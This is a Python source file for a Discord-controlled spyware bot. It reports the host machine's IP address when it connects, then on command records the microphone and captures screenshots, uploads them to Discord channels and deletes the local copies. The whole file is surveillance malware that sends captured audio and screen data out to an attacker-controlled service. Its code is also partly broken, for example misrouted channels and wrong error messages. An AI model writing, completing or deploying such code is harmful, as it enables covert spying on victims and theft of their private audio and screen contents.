import discord
from discord.ext import commands
import os
import socket
import time
import asyncio
from screen import Screenshot, Microphone
from dotenv import load_dotenv
load_dotenv(".env")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=';', intents=intents)
guild_id = "1198070162432200865"
screenshot_channel = "1209205802032955413"
microphone_channel = "1209237919592615937"
connect_channel = "1209247219874668638"

microphone = Microphone()
screenshot = Screenshot()

@bot.command("sendMic")
async def sendMic():
    mic_path = microphone.name
    if not mic_path:
        print("Microphone path is empty.")
        return

    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(screenshot_channel)

    with open(mic_path, 'rb') as screenshot_file:
        await channel.send(file=discord.File(screenshot_file, mic_path))
    
    count = 0
    determine = count + 1
    microphone.record()
    count += 1
    
    if count >= determine:
        mic_path = microphone.name   
        os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
        determine += 1

@bot.command("sendScreen")
async def sendScreen():
    screenshot_path = screenshot.name
    if not screenshot_path:
        print("Microphone path is empty.")
        return

    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(screenshot_channel)

    with open(screenshot_path, 'rb') as screenshot_file:
        await channel.send(file=discord.File(screenshot_file, screenshot_path))
    
    count = 0
    determine = count + 1
    screenshot.printscreen()
    count += 1

    if count >= determine:
        screenshot_path = screenshot.name
        os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
        determine += 1

@bot.event
async def on_ready():
    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(connect_channel)

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")

@bot.event
async def on_message(message):
    await bot.process_commands(message)
   
bot.run(os.getenv("TOKEN"))